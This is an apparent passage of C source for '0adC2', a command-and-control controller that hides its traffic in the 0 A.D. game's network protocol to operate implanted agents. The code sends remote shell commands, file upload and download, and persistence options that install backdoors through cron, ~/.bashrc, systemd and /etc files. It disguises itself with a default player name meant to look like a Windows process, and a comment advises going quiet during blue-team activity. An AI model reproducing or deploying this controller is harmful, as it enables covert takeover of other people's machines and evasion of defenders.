 *                   Agent writes to remote path <r> (defaults to basename of <l>).
 *
 *   !persist <method> — install the agent as a persistent backdoor using one of:
 *                   cron    : add a crontab entry (@reboot or recurring)
 *                   bashrc  : append a launcher to ~/.bashrc
 *                   systemd : create a user systemd service unit
 *                   syscron : create /etc/cron.d/<name> (requires root)
 *                   profile : create /etc/profile.d/<name>.sh (requires root)
 *
 *   !die          — send "die" CTL; agent exits cleanly (cleans up its artifacts).
 *   !sleep <N>    — send "sleep:N" CTL; agent sleeps N seconds before next beacon.
 *                   Useful to lower noise during blue-team activity windows.
 *
 *   <anything else> — treated as a shell command, sent to the agent via V4_CMD.
 *                   The agent runs it asynchronously as a new job and streams
 *                   output back as V4_RSP chunks. Requires ECDH to be done.
 * ─────────────────────────────────────────────────────────────────────────── */
static void cmd_handler(char *line){
    if(!line){g_running=0;return;}
    if(!line[0]){free(line);return;}
    add_history(line);  /* add to readline history (arrow-up to recall) */
    g_handling=1;  /* disable save/restore in aout() */

    if(!strcmp(line,"!quit")){g_running=0;goto done;}
    if(!strcmp(line,"!help")){print_help();goto done;}

    if(!strcmp(line,"!agents")){
        time_t now=time(NULL);
        aout("\n\033[1m[Agents]\033[0m\n");
        for(int i=0;i<n_agents;i++){
            const char *ecdh=agents[i].dh_done ?"\033[1;32mECDH✓\033[0m":
                             agents[i].dh_sent ?"\033[1;33mDH→\033[0m":
                                                "\033[0;31mno DH\033[0m";
            aout("  %-36s  hash=%08x  vu=%ds  %s\n",
                 agents[i].id[0]?agents[i].id:"?",
                 agents[i].aid_hash,(int)(now-agents[i].last_ka),ecdh);}
        if(!n_agents) aout("  (none)\n");
        aout("\n");goto done;}

    if(!strncmp(line,"!target ",8)){
        strncpy(g_target,line+8,sizeof(g_target)-1);
        Agent *ta=get_agent_by_id(g_target);
        if(ta&&ta->dh_done)
            aout("[*] Target: \033[1m%s\033[0m  \033[1;32m[ECDH✓]\033[0m\n",g_target);
        else
            aout("[*] Target: \033[1m%s\033[0m\n",g_target);
        goto done;}

    if(!strcmp(line,"!jobs")){send_ctl("jobs");goto done;}

    if(!strncmp(line,"!kill ",6)){
        char ctl[32];snprintf(ctl,sizeof(ctl),"kill:%s",line+6);
        send_ctl(ctl);goto done;}

    if(!strncmp(line,"!dl ",4)){send_dlrq(line+4);goto done;}

    if(!strncmp(line,"!ul ",4)){
        char local[512]="",remote[512]="";
        sscanf(line+4,"%511s %511s",local,remote);
        if(!remote[0]){const char *bn=strrchr(local,'/');
            strncpy(remote,bn?bn+1:local,sizeof(remote)-1);}
        send_upload(local,remote);goto done;}

    if(!strncmp(line,"!persist ",9)){
        char ctl[64];snprintf(ctl,sizeof(ctl),"persist:%s",line+9);
        send_ctl(ctl);goto done;}

    if(!strcmp(line,"!die")){send_ctl("die");goto done;}

    if(!strncmp(line,"!sleep ",7)){
        char ctl[32];snprintf(ctl,sizeof(ctl),"sleep:%s",line+7);
        send_ctl(ctl);goto done;}

    send_cmd(line);
done:
    g_handling=0;
    free(line);}

int main(int argc, char *argv[]){
    /* ── Usage / help ─────────────────────────────────────────────────────────
     * Check for -h / --help before the argument count check so the user can
     * always get help even if they forget required arguments. */
    if(argc>=2 && (strcmp(argv[1],"-h")==0 || strcmp(argv[1],"--help")==0)){
        printf(
            "Usage: %s <host> <port> [name] [key]\n"
            "\n"
            "Arguments:\n"
            "  host   0 A.D. game server hostname or IP address\n"
            "  port   Game server UDP port (default game port: 20595)\n"
            "  name   Fake player name the controller uses in NMT packets\n"
            "         (default: RuntimeBroker — looks like a Windows process)\n"
            "  key    Pre-shared symmetric key for the C2 protocol\n"
            "         (default: 0adC2DefaultKey — change for operations)\n"
            "\n"
            "Examples:\n"
            "  %s 192.168.1.10 20595\n"
            "  %s 10.0.0.1 20595 Spectator99 MySecretKey\n"
            "\n"
            "The controller connects to the game server as a spectator, then\n"
            "listens for keep-alive beacons from implanted agents, performs\n"
            "ECDH key exchange per agent, and provides a readline prompt for\n"
            "sending commands and receiving output.\n",
            argv[0], argv[0], argv[0]);
        return 0;}

    if(argc<3){
        fprintf(stderr,"Usage: %s <host> <port> [name] [key]\n"
                       "Try '%s --help' for full usage.\n",argv[0],argv[0]);
        return 1;}

    const char *srv_host=argv[1];
    int srv_port=atoi(argv[2]);
    /* Validate port: atoi() returns 0 on parse failure and on the literal "0".
     * Both map to invalid port numbers (0 is reserved; >65535 is out of range). */
    if(srv_port<=0||srv_port>65535){
        fprintf(stderr,"[-] Invalid port: '%s' (must be 1-65535)\n",argv[2]);
        return 1;}

    if(argc>3) strncpy(g_player,argv[3],sizeof(g_player)-1);
    if(argc>4) strncpy(g_key,argv[4],sizeof(g_key)-1);

    if(sodium_init()<0){fputs("libsodium init\n",stderr);return 1;}
    srand((unsigned)time(NULL));
    signal(SIGPIPE,SIG_IGN);

    printf("\033[1;31m╔══════════════════════════════════════╗\033[0m\n");
    printf("\033[1;31m║           0adC2 — Controller         ║\033[0m\n");
    printf("\033[1;31m╚══════════════════════════════════════╝\033[0m\n");
    printf("Server: \033[1m%s:%d\033[0m  Player: \033[1m%s\033[0m  Key: \033[1m%s\033[0m\n\n",
           srv_host,srv_port,g_player,g_key);
    fflush(stdout);

    if(enet_initialize()){fputs("enet init\n",stderr);return 1;}
    g_host=enet_host_create(NULL,1,2,0,0);
    if(!g_host){fputs("enet_host_create\n",stderr);return 1;}

    ENetAddress addr;
    enet_address_set_host(&addr,srv_host);addr.port=(uint16_t)srv_port;
    g_peer=enet_host_connect(g_host,&addr,2,0);
    if(!g_peer){fputs("connect\n",stderr);return 1;}

    ENetEvent ev;
    if(enet_host_service(g_host,&ev,5000)<=0||ev.type!=ENET_EVENT_TYPE_CONNECT){
        fputs("[-] ENet connect failed\n",stderr);return 1;}

    C2SrvInfo srv={0};
    if(c2_do_handshake(g_peer,g_host,&srv,g_player)<0){
        fputs("[-] Handshake failed\n",stderr);return 1;}

    printf("[+] Connected — engine=%s\n",srv.engine);
    printf("[*] Target: %s\n",g_target);
    fflush(stdout);
    print_help();

    /* ── readline async event loop ───────────────────────────────────────────
     * WHY ASYNC readline (callback mode vs. normal getline):
     *   Normally readline blocks waiting for the user to press Enter. During
     *   that block, we cannot receive or display network packets. The async
     *   (callback) API breaks this: rl_callback_handler_install() installs our
     *   cmd_handler as the callback, and rl_callback_read_char() consumes one
     *   character at a time — it never blocks. We call it only when select()
     *   tells us stdin has data (so no busy-loop). Meanwhile the ENet service
     *   call handles incoming packets on every iteration regardless of input.
     *
     * Loop steps each 50 ms:
     *   1. select() with 50ms timeout: are there bytes to read from stdin?
     *   2. If yes: call rl_callback_read_char() → readline processes one char;
     *      if a newline is detected, cmd_handler() is called immediately.
     *   3. enet_host_service() with 0 timeout: drain the ENet receive queue.
     *      Dispatches any incoming V4_KA / V4_RSP / V4_DL packets.
     * ─────────────────────────────────────────────────────────────────────── */
    using_history();
    rl_callback_handler_install(PROMPT, cmd_handler);

    while(g_running){
        fd_set rfds;FD_ZERO(&rfds);FD_SET(STDIN_FILENO,&rfds);
        struct timeval tv={0,50000};  /* 50 ms select timeout → max latency for incoming display */
        int sel=select(STDIN_FILENO+1,&rfds,NULL,NULL,&tv);
        if(sel>0) rl_callback_read_char();  /* consume one char; triggers cmd_handler on newline */

        int ret=enet_host_service(g_host,&ev,0);
        if(ret<0){fputs("[-] ENet error\n",stderr);break;}
        if(ret==0) continue;
        if(ev.type==ENET_EVENT_TYPE_DISCONNECT){
            aout("[-] Disconnected\n");break;}
        if(ev.type==ENET_EVENT_TYPE_RECEIVE){
            handle_incoming(ev.packet->data,ev.packet->dataLength);
            enet_packet_destroy(ev.packet);}}

    rl_callback_handler_remove();
    enet_peer_disconnect(g_peer,0);
    enet_host_service(g_host,&ev,500);
    enet_host_destroy(g_host);enet_deinitialize();
    puts("\n[*] Done");return 0;}
